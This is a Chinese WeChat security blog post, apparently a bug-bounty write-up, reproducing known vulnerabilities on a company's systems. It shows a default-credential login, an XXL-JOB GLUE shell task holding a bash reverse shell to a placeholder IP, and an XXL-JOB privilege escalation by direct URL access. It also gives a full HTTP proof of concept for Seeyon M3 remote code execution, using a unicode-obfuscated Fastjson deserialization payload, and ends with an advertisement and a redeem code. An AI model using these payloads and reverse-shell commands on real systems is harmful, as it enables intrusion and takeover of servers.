---
title: [SRC]某企业的漏洞复现
url: https://mp.weixin.qq.com/s/_qJj85IaZDTTe-k0rnyzCQ
source: Doonsec's feed
date: 2026-05-01
fetch_date: 2026-05-02T04:56:26.957078
---

# [SRC]某企业的漏洞复现

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbDk9orb8OcrjXXQFehVv3qpWWskF4ibrIWBro6e4nDmpHib5uM0lLKlORr3bjaOWibou4iab4RYuW7LIVVpCHnMicAKMnGIksAog2F4/0?wx_fmt=jpeg)

# [SRC]某企业的漏洞复现

略懂安全的三秋
略懂安全的三秋

略懂安全的三秋

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qzel5kQIPbCtibHLJc7dwrreItWub3QLOoGOIblDC1eNuo1r6t1RnPPRAriaDutTAJOqm9cRUgFIUdBpVoOVruSSqZJ8Bb5xtZDQNmeicNic9zs/640?wx_fmt=png&from=appmsg)

这里通过目录扫描扫出了一个登录框

这里查了一下有历史漏洞，所以我就复现一下，前提是能登录后台

很幸运通过admin 123456登录成功

XXL-JOB 后台任意命令执行

新增一个 GLUE 模式任务

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbAp2tOPxp23QV5vdLeIJEF1d6kgA2p5lw4huZMibicEqLKZmQew7TBJsQapkoPgq5yzJia52vstjiaKvjtoYmaiacT9nCyo0YR9eaTw/640?wx_fmt=jpeg)

运行模式 GLUE(Shell)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qzel5kQIPbCrN5k2XiaXlLwia2kE2aWkhxlGQAouWhLGZ9P8kFCcic9lECFKiaHVibv3q2vx0js9oM0ztXvlcbIeoSoOaD5icZItjmqs3lnokethE/640?wx_fmt=png&from=appmsg)

点击 GLUE IDE，编辑脚本：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbBadk4jbxicDcUiaxRZC2ngL6080icGJpoMmrFE4EsLUr1Y0S9CMG6uguPuOFulVVWmbg6iboNcOSTicsOPyYJNJcVKgCgtTE1QrERM/640?wx_fmt=jpeg&from=appmsg)

编辑脚本反弹 shell：

#!/bin/bash

bash -i >& /dev/tcp/your-ip/8888 0>&1

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Qzel5kQIPbDpdEnjruiag3KM478HbPmyloCurlC0hicrfVrZeMoLaptRBr6fE4iaYKzPib6ENZIlfAP7xiaHu1WlIblHwLxSSPiaw1WI0MkaBYZDM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbDWxzYdFU43iaJ7jb4tqeUWibgmlCxbmH6UUy9CNjeBVRao6PQicqYxr6ibcZhtRo7MpnrdibXzf28lbZ1ECghnpB54GTt5RfOvvwicU/640?wx_fmt=jpeg)

XXL-JOB 垂直越权漏洞

![image.png](https://mmbiz.qpic.cn/mmbiz_png/Qzel5kQIPbBgpHRrYl6YxmLvA6MJic5T41vVbOcFn2mTUiaGVdjX68aF4ibBQ2m3hhTbhg2bzmQ62icLZhYvN2bs09Q9ia48FJ3ibFibHjXqYu7bRc/640?wx_fmt=png&from=appmsg)

以普通用户 user 身份重新登录：

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Qzel5kQIPbCxChWWHsShCK3PKwQagodt7XgYXMicLs1HPVPlllN9zfSXk5w4wyFNMiaribjsmf9c2pO9bVFFmicibtia0ZOjWNiaZC51JtnxSt5nhg/640?wx_fmt=png&from=appmsg)

普通用户与管理员用户导航栏：

* 管理员用户 admin：运行报表、任务管理、调度日志、执行器管理、用户管理、使用教程
* 普通用户 user：运行报表、任务管理、调度日志、使用教程

以普通用户 user 身份直接访问 `http://your-ip:8080/xxl-job-admin/jobgroup`，即可获取执行器管理权限：

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Qzel5kQIPbA2pAcr6K2CxG7g9v2JkN2m3TKrzWIvbBgN70YBmdUWibeJ6KWZWUOcfz02TmPvuHAocK7plhGibDqlD6Qayicxqo5HgeicLkee800/640?wx_fmt=png&from=appmsg)

来到另一给系统

![屏幕截图 2026-04-25 004156.png](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbBBWD24v80G0DiaNlcRrt6cwSlCyIc4YJ5N22z6wKibbKF1dyouExeFuJuU8s6HoX3t59AlTgNlH00bKBmlndGG6uFgrVy0C5ruY/640?wx_fmt=jpeg)

这个系统也复现一下

致远M3 RCE漏洞

POC：

POST /mobile\_portal/api/pns/message/send/batch/6\_1sp1 HTTP/1.1

Host:

User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate Connection: close

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none Sec-Fetch-User: ?1

Content-Type: application/json

Content-Length: 3680

 [{"userMessageId":"{\"@\u0074\u0079\u0070\u0065\":\"\u0063\u006f\u006d\u002e\u006d\u0063\u0068\u0061\u006e\u0067\u0065\u002e\u0076\u0032\u002e\u0063\u0033\u0070\u0030\u002e\u0057\u0072\u0061\u0070\u0070\u0065\u0072\u0043\u006f\u006e\u006e\u0065\u0063\u0074\u0069\u006f\u006e\u0050\u006f\u006f\u006c\u0044\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\",\"\u0075\u0073\u0065\u0072\u004f\u0076\u0065\u0072\u0072\u0069\u0064\u0065\u0073\u0041\u0073\u0053\u0074\u0072\u0069\u006e\u0067\":\"\u0048\u0065\u0078\u0041\u0073\u0063\u0069\u0069\u0053\u0065\u0072\u0069\u0061\u006c\u0069\u007a\u0065\u0064\u004d\u0061\u0070:HEX;\"}|","channelId":"111","title":"111","content":"222","deviceType":"androidphone","serviceProvider":"baidu","deviceFirm":"other"}

再读取接口日志内容触发 Fastjson 反序列化`/mobile_portal/api/systemLog/pns/loadLog/app.log`

![](https://mmbiz.qpic.cn/mmbiz_jpg/Qzel5kQIPbAhv2xJdOVUadxdzj2hFH1JAOgS4K1kmho8yNPDfAMUYFhd3fsvYVjKjjgL7R7XiaqP1Lrl58VulpNQp6z8WQ6lXYz4XpaJeLI8/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qzel5kQIPbDdp6y9Whd9Dxlmo1tiaJWFyMJVudEMdEkhDjM6Z32keXStE4xxwGsiaWlbhGakCYW0c94qhSG9SibMpGk354pvnOo11IDZicCEgb4/640?wx_fmt=jpeg&from=appmsg)

无问AI已攻克无数网络安全技术难题，达到人类顶级能力的网安大模型，让你的技术研究效率实现跃升。

无问社区累计解决网安技术问题4,000,000+，140,000+

无问AI远超通用大模型，在网络安全问题理解、代码生成、安全研究分析及其他复杂场景上是你的最佳选择。

链接：https://www.wwlib.cn/index.php/

如果积分不够用可以使用我的积分码，即可领取100积分

兑换链接：https://www.wwlib.cn/index.php/gift

**WUWEN\_OE9fxEYaPHQqivSWXb**

`由于传播、利用本公众号所提供的信息而造成``的任何直接或者间接的后果及损失，均由使用``者本人负责，公众号略懂安全的三秋不``为此承担任何责任，一旦造成后果请自行承担！`

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Qzel5kQIPbCLibpoeKyUIrykBCCd4Ix1Q2SVIyIsc7IGsL6y2kJktXuMpEpkOprEoL5TVjNdLBTeiaVESIo318WKeepXDXS0sfibQPxG3maGhU/0?wx_fmt=png)

略懂安全的三秋

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Qzel5kQIPbCLibpoeKyUIrykBCCd4Ix1Q2SVIyIsc7IGsL6y2kJktXuMpEpkOprEoL5TVjNdLBTeiaVESIo318WKeepXDXS0sfibQPxG3maGhU/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过